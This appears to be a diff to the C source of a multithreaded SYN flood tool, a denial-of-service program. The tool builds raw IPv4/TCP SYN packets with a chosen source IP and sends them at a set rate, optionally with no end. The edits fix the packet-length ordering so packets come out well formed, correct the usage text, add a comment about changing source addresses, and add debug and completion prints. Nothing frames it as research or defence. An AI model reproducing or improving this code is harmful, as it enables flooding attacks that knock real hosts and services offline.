@@ -34,7 +34,7 @@ void syn_flood_print_usage(int mode) {
 				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests] \n");
 	if (mode == 2)
 		printf(
-				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# per setcpsyn_conds] [duration (0 for INF)]\n");
+				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds] [duration (0 for INF)]\n");
 }
 
 void* generate_syn_request1(void *data) {
@@ -47,9 +47,8 @@ void* generate_syn_request1(void *data) {
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
 		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(src_ip));
 
-		//modify src_ip, increment 1.
+		/*** If you want to modify ip address*/
 		//next_ip_addr(src_ip, 1);
-
 		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(dest_ip));
 
 		struct tcphdr tcp_h;
@@ -57,14 +56,19 @@ void* generate_syn_request1(void *data) {
 		tcp_h = tcp_set_source(tcp_h, tcpsyn_produced);
 		tcp_h = tcp_set_dest(tcp_h, tcpsyn_produced);
 		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);
+
 		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
+		/***For SYN TCP request, ACK seq should not be provided.*/
 
 		tcp_h = tcp_set_syn_flag(tcp_h);
 
 		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, 0);
 
-		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
 		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
+		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
+
+		printf("%d\n",((struct iphdr *)packet)->tot_len);
+
 
 		pthread_mutex_lock(&tcpsyn_mutex);
 
@@ -109,7 +113,6 @@ void* generate_syn_request2(void *data) {
 
 		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, 0);
 
-
 		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
 		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
 
@@ -121,7 +124,7 @@ void* generate_syn_request2(void *data) {
 			return 0;
 		}
 
-		if (tcpsyn_produced ==tcpsyn_per_second) {
+		if (tcpsyn_produced == tcpsyn_per_second) {
 			pthread_cond_wait(&tcpsyn_cond, &tcpsyn_mutex);
 		}
 
@@ -232,6 +235,8 @@ void syn_flood_run(char *argv[], int mode) {
 		pthread_join(generate_thread[i], &status);
 		printf("thread %d joined\n", i);
 	}
+
+	printf("SYN flood finished\n");
 
 	pthread_mutex_destroy(&tcpsyn_mutex);
 	pthread_exit(NULL);
